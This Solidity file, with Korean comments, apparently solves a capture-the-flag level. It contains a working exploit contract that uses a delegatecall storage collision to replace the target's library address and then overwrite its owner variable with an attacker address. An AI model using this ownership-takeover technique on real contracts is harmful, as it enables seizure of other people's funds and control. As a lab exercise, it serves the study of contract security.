// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

/* 목표
 * owner 주소를 공격자로 변경
 * 
 * 공격 방식
 * 1. delegatecall을 이용해서 timeZone 라이브러리 함수를 실행하면 변수의 데이터를 경우 Storage Collision 발생
 * 2. 공격자 CA 컨트랙트를 호출 가능할때 owner 변수를 수정할 수 있게 setTime 함수 실행 환경을 설정
 * 3. setFirstTime 함수를 이용해서 timeZone1Library 데이터를 변경하면서 _timeStamp 값을 CA 컨트랙트 주소로 전달
 * 4. timeZone1Library 주소가 CA 컨트랙트로 변경된 것을 확인했다면 setFirstTime 함수를 연달아서 다시 실행하여 
 *    CA 컨트랙트의 setTime 함수를 실행해 owner 정보와 Storage Collision이 발생하도록 유도
 */

interface Preservation {
    function setFirstTime(uint256) external;
    function setSecondTime(uint256) external;
}

contract Solve {
    address public dummy01;
    address public dummy02;
    address public owner;
    uint256 dummy03;
    address target;
    address attacker = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;

    constructor(address _target) {
        target = _target;
    }

    function attack() public {
        Preservation(target).setFirstTime(uint256(uint160(address(this))));
        Preservation(target).setFirstTime(uint256(uint160(attacker)));
    }

    function setTime(uint256 _timeStamp) public {
        owner = address(uint160(_timeStamp));
    }
}